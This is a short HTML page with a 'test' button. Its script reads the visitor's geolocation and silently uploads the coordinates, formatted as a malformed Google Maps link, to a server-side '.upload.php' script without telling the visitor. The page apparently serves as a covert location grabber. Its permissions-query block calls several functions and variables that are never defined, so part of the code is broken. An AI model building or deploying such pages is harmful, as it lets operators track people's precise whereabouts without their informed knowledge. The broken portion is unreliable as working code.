<!DOCTYPE html>
<html>
<body>
<p id="demo"></p>
<button type="button" onclick="getLocation()">test</button>
    <script>
        var x = document.getElementById("demo");
        
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                x.innerHTML = "Geolocation is not supported by this browser.";
            }
        }
        
        function showPosition(position) {

            var loc = "https://www.google.com/maps/place/" + position.coords.latitude + position.coords.longitude;
           // (A) CREATE BLOB OBJECT
           var myBlob = new Blob([loc], {type: "text/plain"});
            // (B) FORM DATA
            var data = new FormData();
            data.append("upfile", myBlob);

            // (C) AJAX UPLOAD TO SERVER
            fetch(".upload.php", {
                method: "POST",
                body: data
            })
        }
        navigator.permissions.query({
            name: 'geolocation'
        }).then(function(result) {
            if (result.state == 'granted') {
                report(result.state);
                geoBtn.style.display = 'none';
            } else if (result.state == 'prompt') {
                report(result.state);
                geoBtn.style.display = 'none';

                navigator.geolocation.getCurrentPosition(revealPosition, positionDenied, geoSettings);
            } else if (result.state == 'denied') {
                report(result.state);
                geoBtn.style.display = 'inline';
            }
            result.onchange = function() {
                report(result.state);
            }
        });
    </script>
</body>
</html>

